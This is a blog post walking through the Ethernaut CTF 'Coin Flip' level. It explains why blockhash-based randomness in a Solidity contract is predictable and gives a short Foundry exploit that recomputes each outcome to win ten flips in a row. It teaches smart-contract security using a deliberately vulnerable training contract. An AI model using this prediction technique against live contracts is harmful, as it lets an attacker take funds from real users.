---
title: 'Ethernaut Challenge #3 Solution — Coin Flip'
excerpt: 'This is Part 2 of the "Let’s play OpenZeppelin Ethernaut CTF" series, where I will explain how to solve each challenge.</br></br>

For this challenge, our end goal is to be able to consecutively guess the coin flip result by calling the `flip()` function passing the correct guess.
'
coverImage: 
  url: '/assets/blog/ethernaut/coinflip.svg'
  credit: 
    name: OpenZeppelin
    url: https://ethernaut.openzeppelin.com/
date: '2022-07-01T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethernaut/coinflip.svg'
---

This is Part 2 of the ["Let's play OpenZeppelin Ethernaut CTF"](https://stermi.xyz/blog/lets-play-openzeppelin-ethernaut) series, where I will explain how to solve each challenge.

> [The Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame created by [OpenZeppelin](https://openzeppelin.com/).
> Each level is a smart contract that needs to be 'hacked'. The game acts both as a tool for those interested in learning ethereum, and as a way to catalogue historical hacks in levels. Levels can be infinite and the game does not require to be played in any particular order.

# Challenge #3: Coin Flip

> This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
>
> Things that might help
>
> - See the Help page above, section "Beyond the console"
>
> Level author(s): [Kyle Riley](https://github.com/syncikin)

For this challenge, our end goal is to be able to consecutively guess the coin flip result by calling the `flip()` function passing the correct guess.

## Study the contracts

First thing that we notice, the Solidity compiler version used is `< 0.8.x`. This mean that the contract would be prone to math underflow and overflow bugs.

This contract is importing and using OpenZeppelin [SafeMath](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) library, so they should be safe about overflow/underflow problems.

There are three state variables:

- `consecutiveWins` initialized by zero from the `constructor`. This variable will count how many consecutive correct guess we have made
- `FACTOR` that is declared as `57896044618658097711785492504343953926634992332820282019728792003956564819968`. Gas optimization tip: it can be declared as `constant` to save gas (see further reading)
- `lastHash` that will be updated each time by the `flip()` function

The only function inside the contract is `flip()`, let's see what it does

```solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
        revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
        consecutiveWins++;
        return true;
    } else {
        consecutiveWins = 0;
        return false;
    }
}
```

This challenge allows you to learn two important aspects about the blockchain:

1. Everything on the blockchain is public, even private variables like `lastHash` and `FACTOR`
2. There is no real "native" randomness in the blockchain, but only "pseudo randomness"

**Note:** I have added some useful links in the "Further reading" section of the article if you want to learn more about these two topics.

Looking at the code of the function, we know that:

1. We know how to calculate the correct `_guess` function parameter. `_guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false`
2. We know that we cannot call multiple time `flip()` in the same block; otherwise the function will revert. This mean that to pass the challenge, we need to at least guess correctly for 11 blocks. If you look at the Factory contract, you will see that the challenge is solved when `instance.consecutiveWins() >= 10`

Knowing that, let's see the solution.

## Solution code

```solidity
function exploitLevel() internal override {

    vm.startPrank(player);

    uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint8 consecutiveWinsToReach = 10;

    while (level.consecutiveWins() < consecutiveWinsToReach) {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(factor);

        level.flip(coinFlip == 1 ? true : false);

        // simulate a transaction
        utilities.mineBlocks(1);
    }
    vm.stopPrank();
}
```

As you see, the solution is pretty straightforward. Loop until the `consecutiveWins()` getter tell us we have reached `10`.

Inside the loop we calculate the value to pass to `flip` replicating the same logic of the `CoinFlip.flip` function.

After calling it, we call `utilities.mineBlock(1);`. This is a utility function that I have created that call Foundry cheat code `vm.roll(targetBlock);` that allow you to set the current block number. Basically, we are just increasing the block number in each loop section to simulate that a new block has been minted.

You can read the full solution of the challenge opening [CoinFlip.t.sol](https://github.com/StErMi/foundry-ethernaut/blob/main/test/CoinFlip.t.sol)

## Further reading

- [SWC-120: Weak Sources of Randomness from Chain Attributes](https://swcregistry.io/docs/SWC-120)
- [SWC-136: Unencrypted Private Data On-Chain](https://swcregistry.io/docs/SWC-136)
- [Chainlink VRF (Verifiable Random Function)](https://docs.chain.link/docs/chainlink-vrf/): a provably fair and verifiable random number generator (RNG)
- [Foundry Book Cheat codes](https://book.getfoundry.sh/cheatcodes/)

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

I **do not give any warranties** and **will not be liable for any loss** incurred through any use of this codebase.

**DO NOT USE IN PRODUCTION**.
